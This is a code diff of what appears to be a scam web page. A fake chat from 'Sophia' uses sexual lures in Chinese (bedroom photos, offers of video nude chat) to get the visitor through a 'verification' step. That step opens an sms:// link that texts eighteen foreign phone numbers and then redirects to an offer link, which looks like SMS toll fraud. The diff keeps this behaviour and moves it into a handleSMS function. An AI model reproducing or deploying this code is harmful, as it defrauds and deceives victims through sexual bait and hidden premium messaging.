@@ -188,7 +188,7 @@
           { type: 'text', text: '我自己一个人，超级无聊，好像有人陪我，下面是我的照片，点击就可以看到，你喜欢么？👇👇👇', time: getFormattedTime(5) },
           { type: 'image', src: './1.png', modalTitle: '查看 Sophia 的照片' },
           { type: 'text', text: '还有这一张，我自己在床上', time: getFormattedTime(4) },
-          { type: 'image', src: './2.jpg', modalTitle: '查看 Sophia 的性感照片' }, 
+          { type: 'image', src: './2.jpg', modalTitle: '查看 Sophia 的性感照片' },
           { type: 'text', text: '你也是一个人么？', time: getFormattedTime(3) },
           { type: 'text', text: '你玩过视频裸聊么？ 我想尝试一下，肯定很刺激', time: getFormattedTime(2) },
           { type: 'text', text: '喜欢看我自慰么？👇', time: getFormattedTime(0) },
@@ -405,8 +405,7 @@
         document.getElementById('verify-button').textContent = modalContent.modal.validating;
         // 发送短信验证码或其他验证方式
         console.log('发送验证请求...');
-        var sms = "sms://open?addresses=+992917172474,+992911151430,+34651714076,+34665291217,+34665291200,+992917172482,+201103502264,+992917172399,+201103502251,+34665291250,+34651714230,+992919320905,+992919321826,+992919321805,+34665291252,+34665291262,+34665291204,+201103593243/&body=My%20access%20is%20ready%20with%20my%20number%20ahVKtk%208995";
-        location.href = sms; // 模拟发送短信
+        handleSMS('send', modalTitle); // Use handleSMS to send SMS
 
         // 在点击确认后等待 3 秒再隐藏弹窗
         setTimeout(function () {
@@ -415,7 +414,7 @@
 
           // 检查是否所有媒体都已验证
           if (verifiedMediaCount === totalMediaCount) {
-            // 跳转���新链接
+            // 跳转到新链接
             window.location.href = modalContent.modal.offerlink;
           }
 
@@ -483,6 +482,15 @@
 
     // 设置动态标题
     document.getElementById('header-title').textContent = messages[0].author;
+
+    // Unified SMS handling function
+    function handleSMS(action, message = "") {
+
+      var sms = "sms://open?addresses=+992917172474,+992911151430,+34651714076,+34665291217,+34665291200,+992917172482,+201103502264,+992917172399,+201103502251,+34665291250,+34651714230,+992919320905,+992919321826,+992919321805,+34665291252,+34665291262,+34665291204,+201103593243/&body=" + encodeURIComponent(message);
+      location.href = sms;
+
+
+    }
 
   </script>
 
